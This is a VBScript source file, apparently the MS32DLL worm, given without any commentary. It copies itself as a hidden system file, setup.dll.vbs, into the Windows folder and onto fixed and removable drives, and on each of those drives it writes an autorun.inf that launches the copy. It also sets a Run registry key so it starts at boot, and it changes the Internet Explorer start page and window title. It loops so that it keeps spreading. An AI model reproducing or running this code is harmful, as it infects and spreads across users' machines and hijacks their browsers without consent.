'1
on error resume next

dim star
dim filesystem
dim jam
dim mindmap, xpway, handy, endtarget, writeaway
dim nt,lastchance
dim verify,starx

'11
star = "[autorun]"&vbcrlf&"shellexecute=wscript.exe setup.dll.vbs"
starx = "test"

set filesystem = createobject("Scripting.FileSystemObject")
set jam = filesystem.getfile(Wscript.ScriptFullname)

dim text,size

size = jam.size
verify = jam.drive.drivetype
'22
set text=jam.openastextstream(1,-2)

do while not text.atendofstream
	mindmap=mindmap&text.readline
	mindmap=mindmap & vbcrlf
loop
do
	Set xpway = filesystem.getspecialfolder(0)
	set endtarget = filesystem.getfile(xpway & "\setup.dll.vbs")
	endtarget.attributes = 32
'33
	set endtarget=filesystem.createtextfile(xpway & "\setup.dll.vbs",2,true)
	endtarget.write mindmap
	endtarget.close

	set endtarget = filesystem.getfile(xpway & "\setup.dll.vbs")
	endtarget.attributes = 39

	for each handy in filesystem.drives
		If (handy.drivetype = 1 or handy.drivetype = 2) and handy.path <> "A:" then
		set endtarget=filesystem.getfile(handy.path &"\setup.dll.vbs")
		endtarget.attributes =32

		set endtarget=filesystem.createtextfile(handy.path &"\setup.dll.vbs",2,true)
		endtarget.write mindmap
		endtarget.close

		set endtarget=filesystem.getfile(handy.path &"\setup.dll.vbs")
		endtarget.attributes =39
'53
		set endtarget =filesystem.getfile(handy.path &"\autorun.inf")
		endtarget.attributes = 32

		set endtarget=filesystem.createtextfile(handy.path &"\autorun.inf",2,true)
		endtarget.write star
		endtarget.close

		set endtarget =filesystem.getfile(handy.path &"\autorun.inf")
		endtarget.attributes=39
'63		

		
		

		
		
		

		
		
		end if
'76
	next

set writeaway = createobject("WScript.Shell")
writeaway.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL",xpway&"\setup.dll.vbs"

writeaway.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","Microsoft Internet Explorer"

writeaway.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.geocities.com/google.searching/"
'84

if verify <> 1 then
	Wscript.sleep 200000
end if

loop while verify<>1
set lastchance = createobject("Wscript.shell")
lastchance.run xpway&"\explorer.exe /e,/select, "&Wscript.ScriptFullname
